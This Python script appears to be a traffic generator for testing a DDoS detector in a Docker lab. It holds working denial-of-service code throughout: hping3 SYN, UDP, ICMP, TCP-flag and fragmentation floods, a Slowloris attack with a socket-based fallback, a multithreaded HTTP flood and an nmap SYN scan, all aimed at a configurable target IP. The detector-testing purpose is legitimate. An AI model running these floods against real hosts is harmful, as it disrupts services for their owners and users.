#!/usr/bin/env python3
"""
=================================================================
ATTACK GENERATOR — Docker Testing
=================================================================
Run this inside the attacker container to simulate DDoS attacks.

Usage (known):
  python3 attack_scripts/run_attack.py --target 172.20.0.10 --type syn
  python3 attack_scripts/run_attack.py --target 172.20.0.10 --type udp
  python3 attack_scripts/run_attack.py --target 172.20.0.10 --type icmp
  python3 attack_scripts/run_attack.py --target 172.20.0.10 --type slowloris

Usage (less-tested / “new” patterns — check Live Monitor):
  python3 attack_scripts/run_attack.py --type ack
  python3 attack_scripts/run_attack.py --type pshack
  python3 attack_scripts/run_attack.py --type rstfin
  python3 attack_scripts/run_attack.py --type xmas
  python3 attack_scripts/run_attack.py --type http
  python3 attack_scripts/run_attack.py --type scan
  python3 attack_scripts/run_attack.py --type frag

Unknown / IF-focused (XGBoost never trained on these shapes):
  python3 /attack_scripts/unknown_if_probe.py --mode jitter
  python3 /attack_scripts/unknown_if_probe.py --mode nullpulse
  python3 /attack_scripts/unknown_if_probe.py --mode sizestorm
  python3 /attack_scripts/unknown_if_probe.py --mode protomix

=================================================================
"""

import argparse
import random
import subprocess
import sys
import time

DETECTOR_IP = "172.20.0.10"

def print_banner(attack_type):
    print(f"\n{'='*55}")
    print(f"  ATTACK TYPE : {attack_type.upper()}")
    print(f"  TARGET      : {DETECTOR_IP}")
    print(f"  (Check the detector window for ALERT messages!)")
    print(f"{'='*55}\n")

# ── 1. SYN FLOOD ────────────────────────────────────────────────────
def syn_flood(target, duration=30):
    """Sends thousands of SYN packets per second — classic DDoS"""
    print_banner("SYN FLOOD")
    print("[*] Sending SYN packets (--flood mode = max speed)...")
    print("[*] The detector should fire: 🚨 ATTACK DETECTED (DDOS-SYN_FLOOD)")
    print(f"[*] Running for {duration} seconds...\n")
    cmd = f"timeout {duration} hping3 -S --flood -V -p 80 {target}"
    subprocess.run(cmd, shell=True)
    print("\n[+] SYN flood complete.")

# ── 2. UDP FLOOD ─────────────────────────────────────────────────────
def udp_flood(target, duration=30):
    """Floods with UDP packets on random ports"""
    print_banner("UDP FLOOD")
    print("[*] Sending UDP packets at flood speed...")
    print("[*] The detector should fire: 🚨 ATTACK DETECTED (DDOS-UDP_FLOOD)")
    print(f"[*] Running for {duration} seconds...\n")
    cmd = f"timeout {duration} hping3 --udp -p 53 --flood {target}"
    subprocess.run(cmd, shell=True)
    print("\n[+] UDP flood complete.")

# ── 3. ICMP FLOOD ────────────────────────────────────────────────────
def icmp_flood(target, duration=30):
    """Ping flood — overwhelms with ICMP echo requests"""
    print_banner("ICMP FLOOD (Ping Flood)")
    print("[*] Sending ICMP echo requests at flood speed...")
    print("[*] The detector should fire: 🚨 ATTACK DETECTED (DDOS-ICMP_FLOOD)")
    print(f"[*] Running for {duration} seconds...\n")
    cmd = f"timeout {duration} hping3 -1 --flood {target}"
    subprocess.run(cmd, shell=True)
    print("\n[+] ICMP flood complete.")

# ── 4. SLOWLORIS ─────────────────────────────────────────────────────
def slowloris(target, duration=60):
    """
    Opens many slow HTTP connections to exhaust server threads.
    Very different from volumetric floods — low bandwidth but deadly.
    """
    print_banner("SLOWLORIS (Slow HTTP Attack)")
    print("[*] Opening slow HTTP connections to exhaust server...")
    print("[*] The detector should fire: 🚨 ATTACK DETECTED (DDOS-SLOWLORIS)")
    print(f"[*] Running for {duration} seconds...\n")
    # slowhttptest simulates SlowLoris
    cmd = f"timeout {duration} slowhttptest -c 1000 -H -g -o /tmp/slowloris -i 10 -r 200 -t GET -u http://{target}:80 -x 24 -p 3"
    result = subprocess.run(cmd, shell=True)
    if result.returncode != 0:
        # Fallback: use Python scapy-based slow sender
        print("[!] slowhttptest not available. Using Python-based simulation...")
        import socket
        sockets = []
        for _ in range(200):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((target, 80))
                s.send(b"GET /?q=" + b"A"*50 + b" HTTP/1.1\r\n")
                s.send(f"Host: {target}\r\n".encode())
                sockets.append(s)
            except Exception:
                pass
        print(f"[+] Opened {len(sockets)} slow connections. Keeping alive for {duration}s...")
        for _ in range(duration // 15):
            for s in list(sockets):
                try:
                    s.send(b"X-a: b\r\n")
                except Exception:
                    sockets.remove(s)
            time.sleep(15)
        for s in sockets:
            try: s.close()
            except: pass
    print("\n[+] SlowLoris attack complete.")

# ── 5. PORT SCAN (RECON) ─────────────────────────────────────────────
def port_scan(target):
    """Scans ports — Reconnaissance phase before attack"""
    print_banner("PORT SCAN (Reconnaissance)")
    print("[*] Running full TCP port scan...")
    print("[*] The detector should fire: 🚨 ATTACK DETECTED (RECON-PORTSCAN)")
    print("[*] This is what an attacker does before choosing attack type.\n")
    cmd = f"nmap -sS -T4 -p 1-10000 {target}"
    subprocess.run(cmd, shell=True)
    print("\n[+] Port scan complete.")

# ── 6. NORMAL TRAFFIC (BASELINE) ─────────────────────────────────────
def normal_traffic(target, count=20):
    """Sends normal-looking HTTP requests — should NOT trigger alerts"""
    print_banner("NORMAL TRAFFIC (should NOT be flagged)")
    print("[*] Sending normal HTTP GET requests...")
    print("[*] The detector should show: ✅ BENIGN\n")
    for i in range(count):
        cmd = f"curl -s -o /dev/null http://{target}:80 || true"
        subprocess.run(cmd, shell=True)
        print(f"[*] Sent request {i+1}/{count}")
        time.sleep(0.5)
    print("\n[+] Normal traffic test complete.")


# ── 7. ACK FLOOD (less common than SYN) ───────────────────────────────
def ack_flood(target, duration=25):
    """TCP ACK flood — often classified as ACK / TCP flag flood family."""
    print_banner("ACK FLOOD")
    print("[*] Expect: ATTACK (label may be ACK_FRAGMENTATION / TCP_FLOOD / similar)")
    print(f"[*] Running for {duration}s...\n")
    cmd = f"timeout {duration} hping3 -A --flood -V -p 80 {target}"
    subprocess.run(cmd, shell=True)
    print("\n[+] ACK flood complete.")


# ── 8. PSH+ACK FLOOD ──────────────────────────────────────────────────
def pshack_flood(target, duration=25):
    """PSH+ACK flood — model class DDOS-PSHACK_FLOOD if features match."""
    print_banner("PSH+ACK FLOOD")
    print("[*] Expect: ATTACK · possible label DDOS-PSHACK_FLOOD / TCP_FLAG_FLOOD")
    print(f"[*] Running for {duration}s...\n")
    cmd = f"timeout {duration} hping3 -PA --flood -V -p 80 {target}"
    subprocess.run(cmd, shell=True)
    print("\n[+] PSH+ACK flood complete.")


# ── 9. RST+FIN FLOOD ──────────────────────────────────────────────────
def rstfin_flood(target, duration=25):
    """RST+FIN flood — abnormal TCP flags at high rate."""
    print_banner("RST+FIN FLOOD")
    print("[*] Expect: ATTACK · possible label DDOS-RSTFINFLOOD / TCP_FLAG_FLOOD")
    print(f"[*] Running for {duration}s...\n")
    cmd = f"timeout {duration} hping3 -RF --flood -V -p 80 {target}"
    subprocess.run(cmd, shell=True)
    print("\n[+] RST+FIN flood complete.")


# ── 10. XMAS SCAN / FLOOD ─────────────────────────────────────────────
def xmas_flood(target, duration=20):
    """XMAS flags (FIN+URG+PSH) — recon-like / anomalous TCP."""
    print_banner("XMAS FLAG FLOOD")
    print("[*] Expect: ATTACK or RECON-style label (or IF anomaly)")
    print(f"[*] Running for {duration}s...\n")
    cmd = f"timeout {duration} hping3 -F -P -U --flood -V -p 80 {target}"
    subprocess.run(cmd, shell=True)
    print("\n[+] XMAS flood complete.")


# ── 11. HTTP FLOOD ────────────────────────────────────────────────────
def http_flood(target, duration=30, workers=40):
    """
    Real volumetric HTTP GET storm (parallel), not 1 curl/sec.
    Uses many threads + raw TCP HTTP payloads so the detector sees
    high pps even if nothing is listening on :80.
    """
    import socket
    import threading

    print_banner("HTTP FLOOD")
    print("[*] Expect: ATTACK · possible label DDOS-HTTP_FLOOD / DOS-HTTP_FLOOD")
    print(f"[*] Parallel workers={workers}, duration={duration}s\n")

    stop = time.time() + duration
    counter = {"n": 0}
    lock = threading.Lock()
    payload = (
        f"GET /index.html?q={random.randint(1, 99999)} HTTP/1.1\r\n"
        f"Host: {target}\r\n"
        f"User-Agent: EdgeGuard-HTTP-Flood-Test\r\n"
        f"Connection: keep-alive\r\n\r\n"
    ).encode()

    def worker():
        while time.time() < stop:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.4)
                s.connect((target, 80))
                for _ in range(8):
                    try:
                        s.sendall(payload)
                        with lock:
                            counter["n"] += 1
                    except Exception:
                        break
                s.close()
            except Exception:
                # Port closed / refused — still hammer SYNs+retries via reconnect loop
                with lock:
                    counter["n"] += 1
                time.sleep(0.002)

    threads = [threading.Thread(target=worker, daemon=True) for _ in range(workers)]
    for t in threads:
        t.start()
    # Progress ticker
    while time.time() < stop:
        time.sleep(2)
        print(f"[*] ~{counter['n']} HTTP request attempts…")
    for t in threads:
        t.join(timeout=1)
    print(f"\n[+] HTTP flood complete ({counter['n']} request attempts).")


# ── 12. IP FRAGMENTATION FLOOD ────────────────────────────────────────
def frag_flood(target, duration=20):
    """Fragmented ICMP/IP — tests FRAG_FLOOD family / anomaly path."""
    print_banner("FRAGMENTATION FLOOD")
    print("[*] Expect: ATTACK · possible ACK/ICMP fragmentation label")
    print(f"[*] Running for {duration}s...\n")
    # -f forces fragmentation; -1 ICMP; small data forces more frags
    cmd = f"timeout {duration} hping3 -1 -f -d 2000 --flood {target}"
    subprocess.run(cmd, shell=True)
    print("\n[+] Fragmentation flood complete.")


# ── MAIN ──────────────────────────────────────────────────────────────
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="DDoS Attack Generator for Testing")
    parser.add_argument('--target',   default=DETECTOR_IP, help='Target IP')
    parser.add_argument('--type',     required=True,
                        choices=[
                            'syn', 'udp', 'icmp', 'slowloris', 'scan', 'normal', 'all',
                            'ack', 'pshack', 'rstfin', 'xmas', 'http', 'frag',
                        ],
                        help='Attack type to launch')
    parser.add_argument('--duration', type=int, default=25, help='Attack duration in seconds')
    args = parser.parse_args()

    target = args.target

    dispatch = {
        'syn': syn_flood,
        'udp': udp_flood,
        'icmp': icmp_flood,
        'slowloris': lambda t, d: slowloris(t, d * 2),
        'scan': lambda t, d: port_scan(t),
        'normal': lambda t, d: normal_traffic(t),
        'ack': ack_flood,
        'pshack': pshack_flood,
        'rstfin': rstfin_flood,
        'xmas': xmas_flood,
        'http': http_flood,
        'frag': frag_flood,
    }

    if args.type == 'all':
        print("\n[*] Running ALL attack types in sequence...")
        normal_traffic(target, 10)
        time.sleep(2)
        syn_flood(target, 15)
        time.sleep(2)
        udp_flood(target, 15)
        time.sleep(2)
        icmp_flood(target, 15)
        time.sleep(2)
        ack_flood(target, 15)
        time.sleep(2)
        pshack_flood(target, 15)
        time.sleep(2)
        port_scan(target)
        print("\n[+] ALL ATTACKS COMPLETE.")
    else:
        dispatch[args.type](target, args.duration)
